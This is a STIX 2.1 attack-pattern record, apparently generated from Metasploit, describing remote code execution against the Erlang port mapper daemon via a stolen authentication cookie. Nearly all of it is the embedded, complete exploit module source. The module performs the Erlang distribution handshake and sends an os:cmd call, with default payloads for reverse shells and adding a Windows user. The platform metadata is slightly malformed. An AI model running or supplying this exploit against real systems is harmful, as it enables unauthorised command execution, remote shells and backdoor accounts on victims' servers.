{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea2d8486-e824-4a1e-b82c-2985a98327de",
    "created": "2024-08-14T17:06:49.363587Z",
    "modified": "2024-08-14T17:06:49.363591Z",
    "name": "Erlang Port Mapper Daemon Cookie RCE",
    "description": " The erlang port mapper daemon is used to coordinate distributed erlang instances. Should an attacker get the authentication cookie RCE is trivial. Usually, this cookie is named \".erlang.cookie\" and varies on location. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/erlang_cookie_rce.rb",
            "external_id": "erlang_cookie_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Erlang Port Mapper Daemon Cookie RCE',\n        'Description'    => %q{\n          The erlang port mapper daemon is used to coordinate distributed erlang instances.\n          Should an attacker get the authentication cookie RCE is trivial. Usually, this\n          cookie is named \".erlang.cookie\" and varies on location.\n        },\n        'Author'         =>\n          [\n            'Daniel Mende',              # blog post article\n            'Milton Valencia (wetw0rk)', # metasploit module\n          ],\n        'References'     =>\n          [\n            ['URL', 'https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/']\n          ],\n        'License'        => MSF_LICENSE,\n        'Privileged'     => 'false',\n        'Targets'        =>\n          [\n            [ 'Unix',\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},\n            ],\n            [ 'Linux (CmdStager)',\n              'Type' => :cmdstager,\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'CmdStagerFlavor' => ['printf', 'echo', 'bourne']\n            ],\n            [ 'Windows',\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/adduser'},\n            ],\n            [ 'Windows (CmdStager)',\n              'Type' => :cmdstager,\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'CmdStagerFlavor' => ['certutil', 'vbs'],\n              'DefaultOptions' => {'PAYLOAD' => 'windows/shell/reverse_tcp'}\n            ]\n          ],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2009-11-20', # https://github.com/erlang/otp/blob/master/lib/kernel/src/os.erl (history)\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('COOKIE', [ true, 'Erlang cookie to login with']),\n        Opt::RPORT(25672)\n      ])\n  end\n\n  def generate_challenge_digest(challenge)\n    challenge = challenge.unpack('H*')[0].to_i(16).to_s\n\n    hash = Digest::MD5.new\n    hash.update(datastore['COOKIE'])\n    hash.update(challenge)\n\n    vprint_status(\"MD5 digest generated: #{hash.hexdigest}\")\n    return [hash.hexdigest].pack('H*')\n  end\n\n  def execute_command(cmd, opts={})\n    # SEND: send the message to the node\n    send =  \"\\x00\\x00\\x00\"                                                        # Length:0x00000000\n    send << [(0x50 + cmd.length + @our_node.length*2).to_s(16)].pack('H*') #\n    send << \"\\x70\"                                                                #\n    send << \"\\x83\"                                                                # VERSION_MAGIC\n    send << \"\\x68\"                                                                # SMALL_TUPLE_EXT (104)\n    send << \"\\x04\"                                                                #   Arity: 4\n    send << \"\\x61\"                                                                #     SMALL_INTEGER_EXT\n    send << \"\\x06\"                                                                #       Int: 6\n    send << \"\\x67\"                                                                #     PID_EXT (103)\n    send << \"\\x64\\x00\"                                                            #       Node:\n    send << [(@our_node.length).to_s(16)].pack('H*')                               #         Length: strlen(Node)\n    send << \"#{@our_node}\"                                                         #         Node\n    send << \"\\x00\\x00\\x00\\x03\"                                                    #       ID\n    send << \"\\x00\\x00\\x00\\x00\"                                                    #       Serial\n    send << \"\\x00\"                                                                #       Creation\n    send << \"\\x64\"                                                                #     InternalSegmentIndex\n    send << \"\\x00\\x00\"                                                            #       Len: 0x0000\n    send << \"\\x64\"                                                                #     InternalSegmentIndex\n    send << \"\\x00\\x03\"                                                            #       Length: 3\n    send << \"rex\"                                                                 #       AtomText: rex\n    send << \"\\x83\\x68\\x02\\x67\\x64\\x00\"                                            #\n    send << [(@our_node.length).to_s(16)].pack('H*')                               # Length: strlen(Node)\n    send << \"#{@our_node}\"                                                         # Node\n    send << \"\\x00\\x00\\x00\\x03\"                                                    # ID\n    send << \"\\x00\\x00\\x00\\x00\"                                                    # Serial\n    send << \"\\x00\"                                                                # Creation\n    send << \"\\x68\"                                                                # SMALL_TUPLE_EXT (104)\n    send << \"\\x05\"                                                                #   Arity: 5\n    send << \"\\x64\"                                                                #     InternalSegmentIndex\n    send << \"\\x00\\x04\"                                                            #       Length: 4\n    send << \"call\"                                                                #       AtomText: call\n    send << \"\\x64\"                                                                #     InternalSegmentIndex\n    send << \"\\x00\\x02\"                                                            #       Length: 2\n    send << \"os\"                                                                  #       AtomText: os\n    send << \"\\x64\"                                                                #     InternalSegmentIndex\n    send << \"\\x00\\x03\"                                                            #       Length: 3\n    send << \"cmd\"                                                                 #       AtomText: cmd\n    send << \"\\x6c\"                                                                #     LIST_EXT\n    send << \"\\x00\\x00\\x00\\x01\"                                                    #       Length: 1\n    send << \"\\x6b\"                                                                #       Elements: k\n    send << \"\\x00\"                                                                #       Tail\n    send << [(cmd.length).to_s(16)].pack('H*')                                    # strlen(Command)\n    send << cmd\n    send << \"\\x6a\"                                                                # NIL_EXT\n    send << \"\\x64\"                                                                # InternalSegmentIndex\n    send << \"\\x00\\x04\"                                                            #   Length: 4\n    send << \"user\"                                                                #   AtomText: user\n    sock.put(send)\n  end\n\n  def exploit\n    connect\n\n    @our_node = \"#{rand_text_alphanumeric(6..12)}@#{rand_text_alphanumeric(6..12)}\"\n\n    # SEND_NAME: send initial identification of who \"we\" are\n    send_name =  \"\\x00\"                                     # Length: 0x0000\n    send_name << [(@our_node.length+7).to_s(16)].pack('H*') #\n    send_name << \"\\x6e\"                                     # Tag: n\n    send_name << \"\\x00\\x05\"                                 # Version: R6 (5)\n    send_name << \"\\x00\\x07\\x49\\x9c\"                         # Flags (0x0007499c)\n                                                            #   DFLAG_EXTENDED_REFERENCES (0x4)\n                                                            #   DFLAG_DIST_MONITOR        (0x8)\n                                                            #   DFLAG_FUN_TAGS            (0x10)\n                                                            #   DFLAG_NEW_FUN_TAGS        (0x80)\n                                                            #   DFLAG_EXTENDED_PIDS_PORTS (0x100)\n                                                            #   DFLAG_NEW_FLOATS          (0x800)\n                                                            #   DFLAG_SMALL_ATOM_TAGS     (0x4000)\n                                                            #   DFLAG_UTF8_ATOMS          (0x10000)\n                                                            #   DFLAG_MAP_TAG             (0x20000)\n                                                            #   DFLAG_BIG_CREATION        (0x40000)\n    send_name << \"#{@our_node}\"                             # <generated>@<generated>\n\n    # SEND_CHALLENGE_REPLY: return generated digest and its own challenge\n    send_challenge_reply =  \"\\x00\\x15\"  # Length: 21\n    send_challenge_reply << \"\\x72\"      # Tag: r\n\n    sock.put(send_name)\n\n    # receive servers \"SEND_CHALLENGE\" token (4 bytes)\n    print_status(\"Receiving server challenge\")\n    challenge = sock.get\n    challenge = challenge[14,4]\n\n    send_challenge_reply << challenge\n    send_challenge_reply << generate_challenge_digest(challenge)\n\n    print_status(\"Sending challenge reply\")\n    sock.put(send_challenge_reply)\n\n    if sock.get.length < 1\n      fail_with(Failure::UnexpectedReply, \"Authentication Failed:#{datastore['COOKIE']}\")\n    end\n\n    print_good(\"Authentication successful, sending payload\")\n\n    print_status('Exploiting...')\n    if target['Type'] == :cmdstager\n      execute_cmdstager(:linemax => 100)\n    else\n      execute_command(payload.raw)\n    end\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-20, # https://github.com/erlang/otp/blob/master/lib/kernel/src/os.erl history",
    "x_mitre_platforms": [
        "win'"
    ]
}